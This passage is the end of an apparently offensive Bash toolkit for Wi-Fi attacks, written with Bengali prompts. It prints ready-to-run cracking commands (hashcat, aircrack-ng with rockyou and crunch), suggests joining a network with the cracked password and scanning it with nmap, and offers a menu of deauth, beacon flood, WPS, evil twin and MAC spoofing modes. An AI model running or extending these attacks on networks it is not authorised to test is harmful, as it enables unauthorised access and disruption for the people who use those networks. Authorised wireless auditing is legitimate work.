        echo -e "  ${CYAN}hashcat -m 22000 $hashfile $DEFAULT_WORDLIST${NC}"
        echo -e "  ${CYAN}hashcat -m 22000 $hashfile $DEFAULT_WORDLIST -r /usr/share/hashcat/rules/best64.rule${NC}"
        echo ""
        echo -e "  ${YELLOW}  সার্বিক ঝুঁকি : ███████░░░ HIGH — PMKID capture সফল${NC}"
    else
        echo -e "  ${YELLOW}[!] PMKID capture হয়নি।${NC}"
        echo -e "     ${WHITE}→ AP PMKID support নাও করতে পারে।${NC}"
        echo -e "     ${WHITE}→ Traditional handshake capture try করুন (mode 5)।${NC}"
    fi
    echo ""
}

# ================================================================
# BANGLA ANALYSIS — DEAUTH
# ================================================================
bangla_analysis_deauth() {
    local outfile=$1

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় Deauth বিশ্লেষণ                                  ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -q "Sending DeAuth" "$outfile" 2>/dev/null || [ -s "$outfile" ]; then
        echo -e "  ${GREEN}[✓] Deauth packets পাঠানো হয়েছে।${NC}"
        echo -e "  ${WHITE}→ Clients disconnect হয়েছে বা হচ্ছে।${NC}"
        echo -e "  ${YELLOW}→ Reconnect এর সময় handshake capture করুন।${NC}"
        echo ""
        echo -e "  ${RED}${BOLD}[!] এই attack 802.11 management frame এর weakness exploit করে।${NC}"
        echo -e "  ${WHITE}→ 802.11w (PMF) enabled হলে এই attack কাজ করে না।${NC}"
        echo ""
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : ███████░░░ HIGH (PMF ছাড়া)${NC}"
    else
        echo -e "  ${YELLOW}[!] Deauth সফল হয়নি হতে পারে।${NC}"
        echo -e "     ${WHITE}→ AP Protected Management Frames (PMF) use করছে।${NC}"
    fi
    echo ""
}

# ================================================================
# NEXT TOOL SUGGESTIONS
# ================================================================
suggest_next_tool_scan() {
    local csvfile=$1

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "  ${RED}${BOLD}📡 Deauth + Capture${NC} — Handshake নেওয়ার জন্য"
    echo -e "     ${CYAN}কমান্ড: Mode 6 select করুন${NC}"; echo ""

    if grep -q "WEP" "$csvfile" 2>/dev/null; then
        echo -e "  ${RED}${BOLD}🔓 WEP Crack${NC} — WEP network crack করুন"
        echo -e "     ${CYAN}কমান্ড: Mode 10 select করুন${NC}"; echo ""
    fi

    echo -e "  ${YELLOW}${BOLD}🔧 WPS Scan${NC} — WPS vulnerable APs খুঁজুন"
    echo -e "     ${CYAN}কমান্ড: Mode 20 select করুন${NC}"; echo ""
    echo -e "  ${MAGENTA}${BOLD}⚡ Hashcat${NC} — GPU দিয়ে দ্রুত crack"
    echo -e "     ${CYAN}কমান্ড: hashcat -m 22000 handshake.22000 rockyou.txt${NC}"; echo ""
}

suggest_next_tool_handshake() {
    local capfile=$1

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if [ -f "$capfile" ]; then
        echo -e "  ${RED}${BOLD}🔑 Aircrack-ng Wordlist Crack${NC}"
        echo -e "     ${CYAN}কমান্ড: aircrack-ng -w rockyou.txt $capfile${NC}"; echo ""
        echo -e "  ${MAGENTA}${BOLD}⚡ Hashcat GPU Crack (দ্রুত)${NC}"
        echo -e "     ${CYAN}কমান্ড: hashcat -m 22000 handshake.22000 rockyou.txt -w 3${NC}"; echo ""
        echo -e "  ${YELLOW}${BOLD}📝 Crunch Custom Wordlist${NC}"
        echo -e "     ${CYAN}কমান্ড: crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - $capfile${NC}"; echo ""
    fi
}

suggest_next_tool_crack() {
    local outfile=$1

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -qi "KEY FOUND" "$outfile" 2>/dev/null; then
        echo -e "  ${GREEN}${BOLD}🌐 Network Connect${NC} — Cracked password দিয়ে connect করুন"
        echo -e "     ${CYAN}কমান্ড: nmcli dev wifi connect SSID password <cracked_pass>${NC}"; echo ""
        echo -e "  ${MAGENTA}${BOLD}🔍 Nmap${NC} — Network এ অন্য devices scan করুন"
        echo -e "     ${CYAN}কমান্ড: nmap -sn 192.168.1.0/24${NC}"; echo ""
    else
        echo -e "  ${YELLOW}${BOLD}⚡ Hashcat GPU${NC} — GPU দিয়ে দ্রুত crack"
        echo -e "     ${CYAN}কমান্ড: Mode 12 select করুন${NC}"; echo ""
        echo -e "  ${BLUE}${BOLD}📚 Crunch${NC} — Custom pattern wordlist"
        echo -e "     ${CYAN}কমান্ড: crunch 8 8 0123456789 | aircrack-ng -w - cap.cap${NC}"; echo ""
        echo -e "  ${GREEN}${BOLD}📝 CUPP${NC} — Social engineering wordlist"
        echo -e "     ${CYAN}কমান্ড: python3 cupp.py -i${NC}"; echo ""
    fi
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local out=$1

    echo ""
    read -p "$(echo -e ${YELLOW}"[?] Result সম্পর্কে history log করবেন? (y/n): "${NC})" sv
    if [[ "$sv" =~ ^[Yy]$ ]]; then
        echo "$(date) | ${SCAN_LABEL:-scan} | $out" >> "$HISTORY_FILE"
        echo -e "${GREEN}[✓] History logged${NC}"
    fi
    echo ""
}

# ================================================================
# MAIN LOOP
# ================================================================
main() {
    show_banner
    check_deps

    while true; do
        show_menu
        read -p "$(echo -e ${YELLOW}"[?] Option select করুন [0-27]: "${NC})" choice

        if [[ "$choice" == "0" ]]; then
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        fi

        case $choice in
            1)  mode_network_scan ;;
            2)  mode_channel_scan ;;
            3)  mode_target_scan ;;
            4)  mode_hidden_ssid ;;
            5)  mode_capture_handshake ;;
            6)  mode_deauth_capture ;;
            7)  mode_pmkid_attack ;;
            8)  mode_continuous_capture ;;
            9)  mode_crack_wpa ;;
            10) mode_crack_wep ;;
            11) mode_crack_rules ;;
            12) mode_crack_hashcat ;;
            13) mode_crack_pmkid ;;
            14) mode_multiple_wordlists ;;
            15) mode_deauth_broadcast ;;
            16) mode_deauth_targeted ;;
            17) mode_beacon_flood ;;
            18) mode_wps_reaver ;;
            19) mode_wps_pixiedust ;;
            20) mode_wps_scan ;;
            21) mode_evil_twin_guide ;;
            22) mode_mac_spoof ;;
            23) mode_enable_monitor ;;
            24) mode_disable_monitor ;;
            25) mode_interface_info ;;
            26) mode_full_auto ;;
            27) mode_allinone_audit ;;
            *)  echo -e "${RED}[!] ভুল অপশন।${NC}" ;;
        esac

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি operation করবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            # Restore monitor mode if needed
            read -p "$(echo -e ${YELLOW}"Monitor mode disable করবেন? (y/n): "${NC})" dis_mon
            [[ "$dis_mon" =~ ^[Yy]$ ]] && [ -n "$MON_INTERFACE" ] && disable_monitor_mode "$MON_INTERFACE"
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        }
        show_banner
    done
}

main
